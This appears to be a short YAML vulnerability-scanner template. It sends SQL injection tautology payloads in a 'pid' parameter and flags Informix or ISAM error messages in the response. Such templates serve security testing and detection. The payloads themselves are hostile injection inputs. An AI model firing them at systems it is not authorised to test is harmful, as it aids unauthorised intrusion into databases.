id: sqli6-informix-30
name: 'SQLi informix probe in pid'
severity: high
type: active
tags:
  - sqli
  - injection
  - informix
description: 'Triggers informix error via pid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      pid:
        - ''') OR ''a''=''a'
        - ''') OR (''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Informix'
          - 'ISAM error'
